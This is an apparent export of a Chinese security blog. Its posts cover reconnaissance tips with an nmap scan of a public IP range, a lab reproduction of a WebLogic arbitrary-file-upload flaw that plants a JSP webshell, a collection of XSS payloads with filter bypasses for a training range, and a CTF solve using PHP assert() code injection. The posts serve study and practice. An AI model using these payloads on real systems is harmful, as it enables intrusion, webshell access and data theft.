<p>传送门：<br><a href="https://l1395851238.github.io/2019/03/20/awvs-de-ji-ben-shi-yong/" target="_blank" rel="noopener">AWVS的基本使用</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/82852117" target="_blank" rel="noopener">Nessus扫描器的使用</a></p>
<h2 id="CMS类型"><a href="#CMS类型" class="headerlink" title="CMS类型"></a>CMS类型</h2><ul>
<li><p>robots.txt文件</p>
<p><img src="/posts/44511/2.png" alt></p>
<p>从wp路径可以看出这个是WordPress的cms</p>
</li>
<li><p>通过版权信息进行查询<br>一般直接拉到底部查看版权信息，有些站点会显示出来</p>
</li>
<li><p>通过查看网页源码的方式<br><img src="/posts/44511/3.png" alt></p>
</li>
</ul>
<h2 id="旁站和C段扫描"><a href="#旁站和C段扫描" class="headerlink" title="旁站和C段扫描"></a>旁站和C段扫描</h2><p>旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！</p>
<p>C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。<br>旁站和C段在线查询地址：<br><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a><br><a href="http://www.5kik.com/" target="_blank" rel="noopener">http://www.5kik.com/</a></p>
<ul>
<li><p>在线查询网站<br><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a><br><img src="/posts/44511/4.png" alt></p>
</li>
<li><p>站长之家<br><a href="http://tool.chinaz.com/" target="_blank" rel="noopener">http://tool.chinaz.com/</a><br><img src="/posts/44511/5.png" alt></p>
</li>
</ul>
<h2 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h2><p>nmap扫描<br><code>nmap -F -sT -v -n 45.33.49.119-120</code></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic复现之任意文件上传</title>
    <url>/posts/30478.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在复现weblogic，今天复现一下其中的任意文件上传漏洞。</p>
<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>此漏洞涉及版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.3.6.0</span><br><span class="line">12.1.3.0</span><br><span class="line">12.2.1.2</span><br><span class="line">12.2.1.3</span><br></pre></td></tr></table></figure>

<h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><ul>
<li><p>进入该漏洞环境目录</p>
<p><code>cd vulhub/weblogic/CVE-2018-2094</code></p>
</li>
<li><p>环境构建</p>
<p><code>sudo docker-compose build</code></p>
</li>
<li><p>启动</p>
<p><code>sudo docker-compose up -d</code></p>
</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>访问<a href="http://your-ip:7001/console，即可看到后台登录页面" target="_blank" rel="noopener">http://your-ip:7001/console，即可看到后台登录页面</a></p>
<p><img src="/posts/30478/1.png" alt="登录界面"></p>
<p>在CVE-2018-2894环境目录下，查看账号密码，运行以下命令：</p>
<p><code>sudo docker-compose logs | grep password</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@localhost:vulhub&#x2F;weblogic&#x2F;CVE-2018-2894# docker-compose logs | grep password</span><br><span class="line">weblogic_1  |       ----&gt; &#39;weblogic&#39; admin password: ofX5JwIc</span><br><span class="line">weblogic_1  | admin password  : [ofX5JwIc]</span><br><span class="line">weblogic_1  | *  password assigned to an admin-level user.  For *</span><br><span class="line">weblogic_1  | *  password assigned to an admin-level user.  For *</span><br></pre></td></tr></table></figure>

<p>输入用户名和密码，进入后台</p>
<p>勾选在“base_domain”下的“高级”下的“启用web服务测试页”这个选项，点击保存。</p>
<h3 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h3><ol>
<li><p>进入上传界面：<a href="http://192.168.220.141:7001/ws_utc/config.do" target="_blank" rel="noopener">http://192.168.220.141:7001/ws_utc/config.do</a></p>
</li>
<li><p>将“通用”下的“当前工作目录”路径设置为：</p>
<p> <code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code></p>
<p>为什么呢？将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的</p>
</li>
<li><p>上传木马</p>
<ul>
<li><p>进入“安全”，点击“添加”，点击“浏览”，选择你要上传的jsp木马，点击“提交”即可</p>
<p><img src="/posts/30478/2.png" alt="上传木马"></p>
</li>
<li><p>按F12，选中上传文件名元素，该标签下有个id元素(时间戳)</p>
<p><img src="/posts/30478/3.png" alt="时间戳"></p>
</li>
</ul>
</li>
<li><p>上传木马的访问路径</p>
<p> <a href="http://your-ip:7001/ws_utc/css/config/keystore/[时间戳id]_[文件名]" target="_blank" rel="noopener">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳id]_[文件名]</a></p>
<p> 我上传的是jsp大马</p>
<p> <img src="/posts/30478/4.png" alt="上传成功"></p>
</li>
<li><p>也可以上传其他木马，用菜刀、蚁剑、冰蝎等连接</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次漏洞复现不是特别难，其中还有一些不明白的地方，比如，在时间戳那个地方，我们怎么知道它用了时间戳修改文件名等等。。。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS_payload收集</title>
    <url>/posts/63039.html</url>
    <content><![CDATA[<p><strong>XSS弹cookie</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(docment.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>XSS弹用户信息</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(navigator.userAgent)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong></p>
<p><a href="https://github.com/pgaijin66/XSS-Payloads" target="_blank" rel="noopener">https://github.com/pgaijin66/XSS-Payloads</a></p>
<p><a href="https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html" target="_blank" rel="noopener">https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html</a></p>
<p><a href="https://www.jianshu.com/p/01377ad556f0" target="_blank" rel="noopener">https://www.jianshu.com/p/01377ad556f0</a></p>
<p><a href="https://github.com/ismailtasdelen/xss-payload-list" target="_blank" rel="noopener">https://github.com/ismailtasdelen/xss-payload-list</a></p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS靶场练习二</title>
    <url>/posts/6855.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="http://test.ctf8.com/" target="_blank" rel="noopener">http://test.ctf8.com/</a></p>
<p><img src="/posts/6855/1.png" alt></p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>name变量通过<code>GET</code>方式传入，直接带入到标签中，没有任何过滤。</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>将第一关的payload带进去，发现输入值被原封不动的输出了。查看页面源代码</p>
<p><img src="/posts/6855/2.png" alt></p>
<p>发现输入的<code>&lt;、&gt;</code>被<code>html</code>编码了。</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>输入点(INPUT_POINT)有两处，一处在标签间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;h2 align&#x3D;&quot;center&quot;&gt;没有找到和INPUT_POINT相关的结果.&lt;&#x2F;h2&gt;</span><br></pre></td></tr></table></figure>

<p>另一处在标签属性处</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;keyword&quot; value&#x3D;&quot;INPUT_POINT&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>对左右尖括号<code>&lt;,&gt;</code>被转化成<code>HTML</code>字符实体(HTML Entity)的情况，想直接构造标签是有难度的(宽字符构造尖括号?)所以从另一处入手。<br>输入点位于属性内，所以闭合属性并构造新属性，基于事件弹窗。<br>(然而如果输入点对&lt;,&gt;,’,”都进行了字符实体转换呢)<br>(构造标签的关键是&lt;,&gt;, 闭合属性的关键是引号)</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>和 level 3 输出点一致</p>
<p>只是level 3中<code>value=&#39;&#39;</code>，而level 4中的<code>value=&quot;&quot;</code>，所以要闭合<code>value</code>上面要用<code>&#39;</code>，此处要用<code>&quot;</code></p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p><img src="/posts/6855/3.png" alt></p>
<p><code>on</code> 替换为 <code>o_n</code>，<code>script</code> 替换为 <code>sc_ript</code><br>因此不能再考虑用事件触发，也不能用<code>script</code>标签触发。</p>
<p><strong>payload</strong></p>
<p>此处的用<code>&quot;&gt;</code>截断属性，再用a标签触发<br>关键在于虽然在h5的内容过滤了，但在属性内未过滤<code>&quot;&gt;</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:%61lert(1)&quot;&gt;click me&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;111&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(&#x2F;1&#x2F;)&quot;&gt;axxx&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>在上一关限制的基础上，将所有的属性，如<code>src</code>、<code>href</code>等等都进行转换。</p>
<p>此处可用大小写混合绕过。</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(&#x2F;1&#x2F;)&quot;&gt;axxx&lt;&#x2F;a&gt;</span><br><span class="line">&quot;&gt; &lt;Script&gt;alert(&#39;handsome boy&#39;)&lt;&#x2F;script&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt; &lt;img Src&#x3D;x OnError&#x3D;alert(&#39;xss&#39;)&gt; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p><code>href</code>, <code>on</code>, <code>script</code>等关键字被删除了。</p>
<p>此处可用双写关键字绕过</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; oonninput&#x3D;alert(1) &quot;</span><br><span class="line">&quot;&gt; &lt;scscriptript&gt;alert&#96;xss&#96;&lt;&#x2F;scscriptript&gt; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>属性中双引号被转换成<code>HTML</code>实体，无法截断属性。<br>由于<code>script</code>关键字被过滤，得考虑绕过方式，使用<code>HTML</code>实体字符绕过<br><code>HTML16</code>编码<br><code>HTML10</code>编码</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:alert(&#x2F;1&#x2F;)</span><br><span class="line">javascript:%61lert(1)</span><br><span class="line">javasc&amp;#x72;ipt:alert&#96;1&#96;</span><br><span class="line">javasc&amp;#x0072;ipt:alert&#96;1&#96;</span><br></pre></td></tr></table></figure>

<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>提交参数中必须要有http关键字</p>
<p><strong>payload</strong></p>
<p><strong>记得替换<code>script</code>，比如用<code>&amp;#x72;</code>替换r</strong><br><code>%0d</code>和<code>%0a</code>,<code>/</code>等有时具有替代空格的作用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;www.0aa.me  &#x2F;&#x2F;利用注释</span><br><span class="line">javascript:%0dhttp:&#x2F;&#x2F;www.0aa.me%0dalert(1)  &#x2F;&#x2F;不能用注释的情况下</span><br></pre></td></tr></table></figure>

<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>可以看出这里<code>keyword</code>变量依然没戏，被<code>HTML</code>实体化输出了出来，所以重点放在<code>t_sort</code>变量上，只过滤了尖括号，然后就直接输出到了标签中，所以这里可以尝试直接在标签中闭合构造事件来弹窗，还得注意一点就是这里的标签使用了<code>type=&quot;hidden&quot;</code>将输入框隐藏了起来，可以手动赋值<code>type</code>的值来覆盖掉先前的属性来达到显示文本框的目的。</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keyword&#x3D;233&amp;t_sort&#x3D;&quot; type&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>与 level 10 类似，寻找新的注入点。<br>原来的<code>t_sort</code>的双引号被过滤了。<br>这次注入点是在 <code>HTTP Request Header</code> 请求头的 <code>Refer</code> 字段。</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; type&#x3D;&quot;text&quot; onmouseover&#x3D;alert&#96;1&#96; &quot;</span><br></pre></td></tr></table></figure>

<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>这一题和上一题类似，只是这里的漏洞点出现在了<code>HTTP</code>请求头的<code>User-Agent</code>。</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-Agent: &quot; type&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>寻找新的注入点，这次是利用<code>cookie</code>中的参数注入。</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cookie: user&#x3D;&quot; type&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>看了先知的wp，才知道是图片exif 藏有xss payload。<a href="https://xianzhi.aliyun.com/forum/read/1462.html?page=2" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/read/1462.html?page=2</a></p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>这题考察<code>Angular JS</code> 的<code>ng-include</code>用法，具体可以参考这篇资料：<a href="http://www.runoob.com/angularjs/ng-ng-include.html" target="_blank" rel="noopener">AngularJS ng-include 指令</a></p>
<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p>
<p>发现可以包含第一关的页面</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">src&#x3D;‘level1.php?name&#x3D;&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;‘</span><br></pre></td></tr></table></figure>

<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>这里过滤掉了script标签，可以尝试使用其他标签通过事件来弹窗，但是也过滤了空格。</p>
<p>可以使用如下符号替代空格</p>
<p><img src="/posts/6855/4.png" alt></p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keyword&#x3D;&lt;img%0asrc&#x3D;x%0aonerror&#x3D;alert(&#39;XSS&#39;)&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>apache漏洞复现</title>
    <url>/posts/37023.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="0bc9941238671938d5de60a836ad3753b266855f9b77802d9889d63db0ed9932"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>docker复现ctf</title>
    <url>/posts/31496.html</url>
    <content><![CDATA[<h1 id="docker复现ctf"><a href="#docker复现ctf" class="headerlink" title="docker复现ctf"></a>docker复现ctf</h1><h2 id="0x00-docker常用命令"><a href="#0x00-docker常用命令" class="headerlink" title="0x00 docker常用命令"></a>0x00 docker常用命令</h2><ol>
<li><p>拉取镜像</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull [image]</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看docker当前镜像</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker image ls </span><br><span class="line"></span><br><span class="line">docker images</span><br></pre></td></tr></table></figure>
</li>
<li><p>新建docker容器，并映射端口号</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p [host port]:[docker port][image]</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看运行中的docker容器</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
</li>
<li><p>进入一个docker容器</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it [container id] bash</span><br></pre></td></tr></table></figure>
</li>
<li><p>拷贝本地文件到docker</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker cp [本地路径] [container id]:[container 路径]</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动/停止一个docker容器</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker start [container id]</span><br><span class="line">docker stop [container id]</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除一个docker容器（注意:在镜像对应的容器后才可以删除镜像ID）</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm [container id]</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="0x01-使用docker搭建一道简单的ctf题目"><a href="#0x01-使用docker搭建一道简单的ctf题目" class="headerlink" title="0x01 使用docker搭建一道简单的ctf题目"></a>0x01 使用docker搭建一道简单的ctf题目</h2><ol>
<li><p>搜索lamp环境的docker镜像</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search lamp</span><br></pre></td></tr></table></figure>
<p> <img src="https://img-blog.csdnimg.cn/20190606212613587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
</li>
<li><p>拉取“tutum/lamp”镜像</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull tutum&#x2F;lamp</span><br></pre></td></tr></table></figure></li>
<li><p>拉取完成以后，查看本地docker镜像</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<p> <img src="https://img-blog.csdnimg.cn/20190606224903772.png" alt></p>
</li>
<li><p>新建一个docker容器</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 100:80 -p 3307:3306 tutum&#x2F;lamp</span><br><span class="line">-d	&#x2F;&#x2F;容器后台运行</span><br><span class="line">-p	&#x2F;&#x2F;指定映射端口</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看系统中运行的docker容器</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
<p> <img src="https://img-blog.csdnimg.cn/20190606225305489.png" alt></p>
</li>
<li><p>使用浏览器访问一下主页，查看映射是否正常</p>
<p> <img src="https://img-blog.csdnimg.cn/20190606225446502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
</li>
<li><p>将ctf题目源码拷贝到container的主目录中</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker cp test_ctf&#x2F; a47e911ecebf:&#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure></li>
<li><p>进入docker container</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it a47e911ecebf bash</span><br><span class="line">-i	&#x2F;&#x2F;让容器的标准输入保持打开</span><br><span class="line">-t	&#x2F;&#x2F;让docker分配一个伪终端并绑定到容器的标准输出上</span><br></pre></td></tr></table></figure>

<p> <img src="https://img-blog.csdnimg.cn/20190606230157180.png" alt></p>
</li>
<li><p>进入容器中的数据库，创建好ctf题目需要的数据库、数据表等等。<br>（数据库密码为空）</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>

<p> <img src="https://img-blog.csdnimg.cn/20190606230404383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
</li>
<li><p>到这里，这个ctf题目就搭建好了，我们访问一下</p>
<p><img src="https://img-blog.csdnimg.cn/201906062306271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20190606231004570.png" alt></p>
</li>
</ol>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>git泄露</title>
    <url>/posts/55935.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在做ctf的题，碰到了GitHack，刚好大佬学长有一道这方面的题，拿来练练手。现在总结一下。</p>
<a id="more"></a>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="链接：http-web-jarvisoj-com-32798"><a href="#链接：http-web-jarvisoj-com-32798" class="headerlink" title="链接：http://web.jarvisoj.com:32798/"></a>链接：<a href="http://web.jarvisoj.com:32798/" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/</a></h2><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>既然知道是git泄露了，那就废话少说，抄家伙！！！<br>下载GitHack：</p>
<p><code>git clone https://github.com/lijiejie/GitHack</code></p>
<p>执行GitHack：</p>
<p> <code>python GitHack.py http://web.jarvisoj.com:32798/.git/</code></p>
<p> <img src="/posts/55935/git1.jpg" alt><br>** <code>index.php</code>核心代码：**<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   if (isset($_GET[&#39;page&#39;])) &#123;</span><br><span class="line">           $page &#x3D; $_GET[&#39;page&#39;];</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">           $page &#x3D; &quot;home&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   $file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line">   assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line">   assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class="line">   ?&gt;</span><br></pre></td></tr></table></figure></p>
<p> 分析代码可以看到：</p>
<ul>
<li><p>需要传个<code>page</code>参数</p>
</li>
<li><p><code>file = &quot;templates/&quot;.$page.&quot;.php&quot;</code></p>
</li>
<li><p>通过<code>assert</code>函数进行了两次友好（）的判断回显，如果不符合假定，就执行<code>or</code>后面的语句</p>
<p><code>bool assert(mixed $assertion[,string $description])</code>，如果<code>assertion</code>是字符串，他会被<code>assert()</code>当做php代码执行。会执行！！！</p>
</li>
</ul>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>思路是通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码。</p>
<ul>
<li><p><code>&#39;) or phpinfo();#</code> ——即变成<code>file_exists(&#39;&#39;) or phpinfo();#</code> ，结果为执行<code>phpinfo()</code>，注意要url编码，本处为了方便阅读，以编码前显示</p>
</li>
<li><p><code>&#39;) or print_r(file_get_contents(&#39;templates/flag.php&#39;);#</code> ——然后在源代码里（临门一脚不要被坑了）</p>
</li>
</ul>
<p>即构造payload1:</p>
<p><code>?page=&#39;)%20or%20print_r(file_get_contents(&#39;templates%2fflag.php&#39;))%3b%23</code></p>
<p><img src="/posts/55935/git2.jpg" alt></p>
<p>payload2：</p>
<p><code>&#39;,&#39;..&#39;)===False and system(&#39;cat templates/flag.php&#39;);//</code></p>
<p><img src="/posts/55935/git3.jpg" alt></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这道题，了解到了GitHack，了解到了git泄露，美滋滋！！！</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>源码泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/posts/16107.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章！</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="ba6dfe94f4eefac9f4c1dfd6b938a978a6b3c4472e8c1bb3bc4719cb2c363dc6">0080238256e3bfab0aad7c6c06adfe08978cf5e4291d19911e89ab77562c795911e174036507d9011817cf2cd0bf4820c481a07fc1f4c68e50a9d7cffbbedaefae12ce81e6c9c0784f5689c858659271c63cd66cfb5a98a47ec5debadb1bd9e728e8309d12cdce8e1f78cba620e874c4411dd7bf75f305dc01e27c342c5d2e21b64e59da6970bcf66d3f55cba5b7bdcaaf081f23692ad77a4c1127bf66bf048d6166f1c46b4ec70fb36b8340fa0e5722559de262ab079f945fbdaca867deb295596bf12cbf5bdc6a3fc465877bfcbe004189a64bfa690ad6d286d1beed5c3edcb526531cec3eadc618be453b0bcca787545b949da46237c40f747e666ba266c019eb4e1659ca03bd11b7adde11ff40a3c924cb6100e5eb1bcf97d7ef00387dca4a68b3508cdfd84fe2f20d147c2d0d5587e17655a90884d9d059ce76357cedfd204c63867b21f9c00dcd2fff8b0331a2d4473305f5a09ab631d617014ab8893423ad6186306492e94797f0185cd56d7ff4f986a08d5e36ff284ab537a9d281a5d4475fef3ca4abd75b1e895f258a8aef2b085b0be236e2473a34845554e1fee0a970f5c3a41d467511316368cc37c344d8e6524ff13fb28eac0493ea84f215f09bb3eeb9b0537c7e0f21f6ee1e2159d3be456639fd85a6d603586ebf85498d54527653319b18e3f6bc3ddc47e270560f300bbc53b657a9d4985fa1aa85f5162c47897542480aaa2d5c2f022ebad717e95660038e60503fc1b91f8a79a80df0b583ce0fab7776d011ce62a1dc93b